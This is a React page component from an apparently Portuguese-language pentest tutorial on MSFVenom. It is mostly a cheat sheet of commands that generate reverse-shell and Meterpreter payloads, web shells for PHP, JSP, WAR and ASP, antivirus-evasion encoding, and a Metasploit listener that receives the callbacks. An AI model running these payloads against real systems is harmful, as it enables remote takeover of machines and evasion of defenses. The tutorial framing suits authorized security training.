import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";

export default function Msfvenom() {
  return (
    <PageContainer
      title="MSFVenom"
      subtitle="Geração de payloads e shellcodes para testes de penetração."
      difficulty="avancado"
      timeToRead="10 min"
    >
      <AlertBox type="danger" title="Uso exclusivo para pentest autorizado">
        Payloads gerados com MSFVenom podem ser detectados como malware pelos antivírus. 
        Crie e execute apenas em ambientes de laboratório ou com autorização explícita.
      </AlertBox>

      <h2>O que é o MSFVenom?</h2>
      <p>
        O <strong>MSFVenom</strong> combina o msfpayload e o msfencode em uma única ferramenta. 
        Permite gerar payloads (shellcodes, executáveis, scripts) para diversas plataformas 
        que estabelecem conexão reversa com o Metasploit.
      </p>

      <h2>Payloads básicos</h2>
      <CodeBlock language="bash" code={`# Windows — Reverse TCP (conexão reversa)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f exe > payload.exe

# Windows — Staged vs Stageless
# Staged: windows/x64/meterpreter/reverse_tcp  (pequeno, precisa de handler)
# Stageless: windows/x64/meterpreter_reverse_tcp  (completo, mais detectável)

# Linux — Reverse TCP ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f elf > payload.elf
chmod +x payload.elf

# macOS
msfvenom -p osx/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f macho > payload.macho`} />

      <h2>Payloads web</h2>
      <CodeBlock language="bash" code={`# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw > shell.php

# JSP (Java — para Tomcat/JBoss)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw > shell.jsp

# WAR (para Tomcat Manager)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f war > shell.war

# ASP (para IIS Windows)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f asp > shell.asp

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f aspx > shell.aspx`} />

      <h2>Payloads para scripts</h2>
      <CodeBlock language="bash" code={`# Python
msfvenom -p cmd/unix/reverse_python \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw > shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw > shell.sh

# PowerShell (Windows)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f ps1 > shell.ps1

# Shellcode em C (para exploração manual)
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f c

# Shellcode em Python
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f python`} />

      <h2>Evasão de antivírus (encoding)</h2>
      <CodeBlock language="bash" code={`# Listar encoders disponíveis
msfvenom --list encoders

# Encoding básico (x86/shikata_ga_nai)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 \
  -f exe > encoded.exe

# Múltiplas iterações
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x86/shikata_ga_nai -i 15 \
  -b "\\x00\\x0a\\x0d" \                   # bad chars
  -f exe > payload_evasao.exe`} />

      <h2>Configurando o handler (Listener)</h2>
      <CodeBlock language="bash" code={`# No msfconsole — configurar listener para receber conexões
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0        # ouvir em todas as interfaces
set LPORT 4444
set ExitOnSession false   # continuar escutando
run -j                    # rodar em background (job)

# Quando o payload executar no alvo, você obtém sessão Meterpreter!
sessions -l               # listar sessões abertas
sessions -i 1             # interagir com sessão 1`} />

      <h2>Verificar bad chars</h2>
      <CodeBlock language="bash" code={`# Gerar todos os bytes (1-255) para testar buffer overflow
msfvenom -p generic/custom PAYLOADFILE=./shellcode.bin \
  -a x86 --platform Windows -f raw | head

# Gerar badchars completo
python3 -c "import sys; sys.stdout.buffer.write(bytes(range(1,256)))" > badchars.bin`} />
    </PageContainer>
  );
}
